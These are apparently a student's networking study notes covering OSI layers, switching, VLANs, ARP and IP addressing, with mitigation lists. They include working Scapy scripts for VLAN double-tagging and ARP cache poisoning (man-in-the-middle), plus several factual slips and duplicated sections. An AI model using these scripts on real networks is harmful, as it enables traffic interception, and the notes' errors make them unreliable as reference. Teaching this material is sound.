OSI Layer	PDU	Common Protocols
7 - Application

Data

DNS, HTTP, TELNET

6 - Presentation

Data

SSL, TLS, JPEG, GIF

5 - Session

Data

NetBIOS, PPTP, RPC, NFS

4 - Transport

Segment/Datagram

TCP, UDP

3 - Network

Packet

IP, ICMP, IGMP

2 - Data Link

Frames

PPP, ATM, 802.2/3 Ethernet, Frame Relay

1 - Physical

Bits

Bluetooth, USB, 802.11 (Wi-Fi), DSL, 1000Base-T


# OSI Acro:

(Please Do Not Throw Sausage Pizza Away)

# PDU Acro:

(Because Fresh Pizza Tastes Delicious Delicious Delicious)



# EXPLAIN OSI LAYER 1 DATA COMMUNICATIONS AND TECHNOLOGIES

  Binary

  Decimal

  Hexadecimal

  Base64

# Binary 

 Base 2 ( 0& 1 )

 Bit = 1 Bit

 Nibble = 4 Bits

 Byte = 8 Bits

 Half Word = 16 Bits

 Word = 32 Bits

# Decimal

 Base 10

# Hex

Base 16 (0 -9 & A - F)


# Base 64

64 Symbols (A-z, a-z, 0-9,+,/)

Uses (=) to represent a null value (max 2)

EX:
	MTIzNdhy836==

Every Base64 Character has a binary value representation


# Topologies

## Bus

A bus network is a network topology in which nodes are directly connected to a common half-duplex link called a bus.

## Star

A star network is an implementation of a spoke–hub distribution paradigm in computer networks. In a star network, every host is connected to a central hub. In its simplest form, one central hub acts as a conduit to transmit messages.

## Ring

A ring network is a network topology in which each node connects to exactly two other nodes, forming a single continuous pathway for signals through each node – a ring. Data travels from node to node, with each node along the way handling every packet.



## Mesh

A mesh network is a local network topology in which the infrastructure nodes (i.e. bridges, switches, and other infrastructure devices) connect directly, dynamically and non-hierarchically to as many other nodes as possible and cooperate with one another to efficiently route data from/to clients. This lack of dependency on one node allows for every node to participate in the relay of information. Mesh networks dynamically self-organize and self-configure, which can reduce installation overhead. The ability to self-configure enables dynamic distribution of workloads, particularly in the event a few nodes should fail. This in turn contributes to fault-tolerance and reduced maintenance costs.

## Wireless

A wireless network is a computer network that uses wireless data connections between network nodes. Note: All wireless connections eventually connect to a wired network.

## Hierarchial

The hierarchical topology model is made up of the following:

	A core layer of high-end switches optimized for network availability and performance.

	A distribution layer of switches implementing forwarding decisions.

	An access layer connecting users via hubs, bridges, or switches.

 	Typically  made up of multiple topologies

  	Access Layer - User

    Distribution - Routers, etc.

 	Core - Where everything is tied to "Back bone", where everything goes out of

# Devices

## Hubs

Put infomation into one port and it'll broadcast it out to everything connected to it

## Repeaters

Goal is to extend a single cable, to extend max effective range

## Switches

Does not broadcast to everyone, deals with colision domains, does not have to have an ip, always has mAc, ARP


## Routers

BACKBONE of the internet, have routing tables, collection of ipv4/6 info, telling you how to get there


# Ethernet Timing

How fast info is sent from one end of wire to another

Speed 	Time
10 Mbps	100 ns
100 Mbps 10ns
1 Gbps	1ns
10 Gbps .1ns
100 Gbps .01ns


# Layer 2 Data Link Layer

Lan Technologies

Ethernet 802.3(x)

Wireless 802.11(x)

Token Ring 802.5

## Sub Layers

MAC ( Medium Access Control )

LLC ( Logical Link Control )

## Message Formating and terminology

Babushka Doll

Header -  Layer 2 to Layer 7

Data -Payload 

Footer - FCS/CRC


## Encapsulation and Decapsulation

![PDU_SDU](https://github.com/user-attachments/assets/5ff14a51-acf9-40f7-850c-8b9c5e72c491)

Ex:

Eth-IPv4-TCP-App-Payload-FCS

# Switch Operation

Builds MAC Address table (CAM)

	Learns by reading source MAC

 Forwarding Frames

 	Decision based on DMAC

## Switch Operation

 Modes

 	Cut-Through (Fast Forward)

	Fragment Free
 			Looks at first 64 bits to decide what to do with it
	
	Store and Forward
 			Doing its checking, once verified it will be forwarded out, wont send anything until it receives entire frame

 ## Cam Table Overflow Attack

  	Send frames with bogus SMAC addr to switch

    Cause switch to fill table with trash addr(DOS ATTACK)

    Switch will not be able to learn new valic MAc addr

 ## Mac Addr

 Length 48-bit|6 byte|12 HEx

 ### Format
 	Win: 001-54-fa-cb

  	Lin: 01:02:23:45:68

    Cisco: 1234.5678.9874

### Parts
	OUI - First 24 bits assigned by bIANA
 	Vendor Assigned Last 24 bits
	6 Octets or 3(OUI) & 3(Vendor)
 MAC IS NOT SENT OUTSIDE NE

 ## MAC Type

 	Uni: 1-1
  		8th bit = 0

 	Multi: 1-Many
  		8th bit = 1

 	Broadcast: 1-All
		All bits on

## MAc Spoofing

	Could not be changed at first
 	Used to be called
  		hardware
		firmware
  		burned-in
	Now can be change w/software

## Header Type

	MAC Header/Trailer (14 bytes)
 		DMAC (1st 6), 
   		SMAC (2nd 6), 
	 	Ether Type 08x00 IPv4/0x0806 ARP/0x86DD IPv6/, 0x8100 VLAN Tag
 	Data (46-1500 bytes)
  		Payload/Data/SDU
		(ARP,IP,TCP,etc.)
  	CRC/FCS(4 bytes)


  # VLAN

  	Default - VLAN 1
    	Data - User Traffic
	Voice - VOIP traffic
 	Management - Switch and router mgmt (Usually want it out of band)
  	Native - Untagged switch and router traffic

![802 1QFrame](https://github.com/user-attachments/assets/f6696d90-bee9-46a8-a313-2498b1d36d31)

	VLAN tag will go to switch, once it takes it, it'll be removed and ethertype would be put back in place

 ## 802.1AD Header

 
![802 1adframe](https://github.com/user-attachments/assets/c159df1c-ea9d-436a-9afd-848a80bb948b)

## VLAN Hopping ATTACK

	Swith Spoofing
 	Single Tagging
  	Double TAgging(Using native VLAN)
   	SCAPY Example Code

```
a=Ether()
a.dst="ff:ff:ff:ff:ff:ff"
a.src="01:02:03:aa:bb:cc"
a.type=0x8100            #VLAN Tag will Follow

b=Dot1Q()
b.vlan=1                 #Native VLAN
b.type=0x8100            #Another VLAN Tag will Follow

c=Dot1Q()
c.vlan=20                #Target VLAN
c.type=0x0800            #IPv4 or any other Ethertype that is encapsulated

d=IP()
d.proto=6                #specifies that TCP is encapsulated. Change to 1 for ICMP or 17 for UDP.
d.src="10.10.0.40"       #Any source IP
d.dst="172.16.82.106"    #Target IP

e=TCP()
e.sport=54321
e.dport=80

f="message"

a.show()
b.show()
c.show()
d.show()
e.show()

sendp(a/b/c/d/e/f)

```

# ARP Header


![ARP_Header](https://github.com/user-attachments/assets/ceaf05ed-1bb2-49a2-9f77-ecda20321d98)

Find Byte Offset Value by adding offset size (Left) and add to number in second row going horizontal

Ex. Protocol Address Length is 4 + 1 = 5

*** KNOW OPERATION TYPES ***

## Types

ARP(OP 1 and 2) (Req and Reply)
RARP (OP 3 and 4) (RReq and RReply)
Proxy Arp (OP 2/Reply) (Legit, used like a forward)
Gratuitous ARP(OP 2/Reply) Received reply when no request is sent)


## ARP CACHE

All resolved MAC to IP resolutions

If MAC is not in cache then ARP is used

Dynamic entries last from 2-20 minutes

Default gateway is present at minimum

Can be easily duped(spoofed) by attackers



MITM with ARP
	Poison ARP Cache with:

		Gratuitous ARP

		Proxy ARP

  SCAPY Example Code

```
my_mac = ""             # Insert your MAC address
victim1_mac = ""        # Insert the MAC address of Victim1
victim1_ip = ""         # Insert the IP address of Victim1
victim2_mac = ""        # Insert the MAC address of Victim2
victim2_ip = ""         # Insert the IP address of Victim2

# -- ARP to Poison Victim 1 to pretend to be Victim 2 --
a = Ether()
a.src= my_mac
a.dst= victim1_mac
a.type= 0x0806

b = ARP()
b.op= 2
b.hwsrc= my_mac
b.psrc= victim2_ip
b.hwdst= victim1_mac
b.pdst= victim1_ip

# -- ARP to Poison Victim 2 to pretend to be Victim 1 --
c = Ether()
c.src= my_mac
c.dst= victim2_mac
c.type= 0x0806

d = ARP()
d.op= 2
d.hwsrc= my_mac
d.psrc= victim1_ip
d.hwdst= victim2_mac
d.pdst= victim2_ip

a.show()
b.show()
c.show()
d.show()

sendp(a/b); sendp(c/d)

```

## VLAN Trunking Protocol (VTP)


![VTP](https://github.com/user-attachments/assets/4fd051b5-85f9-4980-8faf-89d949f11f34)
	
 	Dynamically add/remove/modify VLANs

If using VLAN you are probably using VTP

### Cisco proprietary

	Modes:

		Server

		Client

		Transparent(Special hidden VLAN, is not affected by server or rest of net)
## VTP Vulnerability

	Can cause switches to dump all VLAN info

 	Cause a DoS as switch will not support configured VLANS


## DTP

![DTP_Chart](https://github.com/user-attachments/assets/61d027a1-70b0-4361-80c3-72542e281554)

Used to dynamically create trunk links

	Cisco proprietary

		Modes:

			Dynamic-Auto

			Dynamic-Desirable

   	On by deafukt

	Can send crafted messages to foirm a VLAN trunk link
 	Recommend to :
  		Disable DTP negotiations
    		Manually assign as access or trunk

## CDP, FDP and LLDP (Proprietary)

	Cisco Discovery Protocol (CDP)

	Foundry Discovery Protocol (FDP)

	Link Layer Discovery Protocol (LLDP)

### Vulnerabilities

	
	Leaks valuable information

	Clear Text

	Enabled by default

	Disable it:

		Globally

		Per interface

	May require it for VOIP

 
## Spanning Tree Protocol (STP)

![Spanning-Tree-Protocol-Overview](https://github.com/user-attachments/assets/8e043fb1-47c0-4fb0-9197-61fe7024e87c)


	Root Decision Process (Convergence)

		1. Elect root Bridge ( Who is tied to router, will designaete root port)

		2. Identify the Root ports on non-root bridge 

		3. Identify the Designated port for each segment
		
		4. Set alternate ports to blocking state

### STP Types

	802.1D STP

	Per VLAN Spanning Tree + (PVST+)

	802.1w – Rapid Spanning Tree Protocol (RSTP)

	Rapid Per VLAN Spanning Tree + (RPVST+)

	802.1s (Multiple Spanning Tree)

 All basicaly do same thing, finds the quickest way out


### Spanning Tree Attack

	Crafted Bridge Protocol Data units (BPDU)

	Used to perform a DoS or MitM

## Port Security

	Shutdown (default)

	Protect

	Restrict

 When device is plugged into switch, if MAC matches what it has, it'll be fine
 If it doesn't it'll execute one of the three modes above


CAN HELP TO:

	Restrict unauthorized access

	Limit MAC address learned on port

	Prevent CAM Table Overflow attacks
### Port Sec Vul

	Dependant on MAC address

	MAC spoofing
  

## LAYER 2 ATTACK MITIGATION TECHNIQUES
	Shutdown unused ports

	Enable Port Security

	IP Source Guard

	Manually assign STP Root

	BPDU Guard

	DHCP Snooping

## LAYER 2 ATTACK MITIGATION TECHNIQUES
802.1x

Dynamic ARP inspection (DAI)

Static CAM entries

Static ARP entries

Disable DTP negotiations

Manually assign Access/Trunk ports

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# NETWORK LAYER

Addressing Schemes for Network (Logical Addressing)

Routing

Encapsulation

IP Fragmentation and Reassembly

Error Handling and Diagnostics

## INTERNET PROTOCOL VERSIONS
IPv4 (ARPANET 1982)

Classful subnetting

Classless subnetting (CIDR)

NAT

IPv6 (Standardized 2017)

EXPLAIN IPV4 ADDRESSING
DESCRIBE CLASSFUL IPV4 ADDRESSING AND SUBNETTING
Class A (0 to 127)

Class B (128 to 191)

Class C (192 to 223)

Class D (224 to 239) - Multicasting

Class E (240 to 255) - Not used

EXPLAIN IPV6 ADDRESSING


## INTERNET PROTOCOL VERSIONS
IPv4 (ARPANET 1982)

Classful subnetting

Classless subnetting (CIDR)

NAT

IPv6 (Standardized 2017)

EXPLAIN IPV4 ADDRESSING
DESCRIBE CLASSFUL IPV4 ADDRESSING AND SUBNETTING
Class A (0 to 127)

Class B (128 to 191)

Class C (192 to 223)

Class D (224 to 239) - Multicasting

Class E (240 to 255) - Not used


EXPLAIN IPV6 ADDRESSING


## SUBNETTING
IP addresses:

Network Portion

Host Portion

Practice of "borrowing" host bits and used them as subnet bits.


![IPv4_Header](https://github.com/user-attachments/assets/bf6b69d7-ddfa-46c0-9c62-0b6ef6e7fd78)


## IDENTIFY IPV4 ADDRESS TYPES
Unicast

Any Class A thu C

Multicast

Class D

Broadcast

Any IP were the host portion is all on

## IPV4 ADDRESS SCOPES
Public

Private (RFC 1918)

Loopback (127.0.0.0/8)

Link-Local (APIPA)

Multicast (class D)

## IPV4 FRAGMENTATION
Breaking up packets from higher MTU to lower MTU network

Performed by routers

MF flag is on from 1st until 2nd to last

Offset is on from 2nd until the last

Offset = (MTU - (IHL x 4)) ÷ 8

** Default MTU is 1500 bytes
IHL is length of words that are in the IHL***

EXPLAIN IPV6 ADDRESSING
DESCRIBE IPV6 ADDRESSING
IPv6 Addressing

128 bit address

64-bit Prefix (4 hextets)

64-bit Interface ID (4 hextets)

340 undecillian addresses

ANALYZE INTERNETWORK ROUTING



## Fragmentation Process

![Fragmentation](https://github.com/user-attachments/assets/ff70d99f-58bb-46fd-91e8-2ee8c38ff3b1)

Teardrop  ATTAck

You can insert your own packet and it will replace a fragment of a packet and overwrite everything that follows it


EXPLAIN IPV6 ADDRESSING
DESCRIBE IPV6 ADDRESSING
IPv6 Addressing

128 bit address

64-bit Prefix (4 hextets)

64-bit Interface ID (4 hextets)

340 undecillian addresses

ANALYZE INTERNETWORK ROUTING


